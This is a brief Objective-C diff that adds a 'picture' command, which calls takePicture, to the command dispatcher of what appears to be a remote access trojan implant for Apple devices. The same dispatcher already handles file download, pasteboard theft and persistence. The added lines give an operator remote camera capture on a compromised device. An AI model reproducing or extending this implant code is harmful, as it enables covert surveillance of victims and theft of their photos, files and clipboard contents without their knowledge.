@@ -129,6 +129,8 @@ void interact(NSDictionary* arguments) {
             [esCommand showAlert:args];
         } else if ([cmd isEqualToString:@"download"]) {
             [esCommand sendFile:args];
+        } else if ([cmd isEqualToString:@"picture"]) {
+            [esCommand takePicture:[args boolValue]];
         } else if ([cmd isEqualToString:@"getpaste"]) {
             [esCommand getPasteBoard];
         } else if ([cmd isEqualToString:@"persistence"]) {
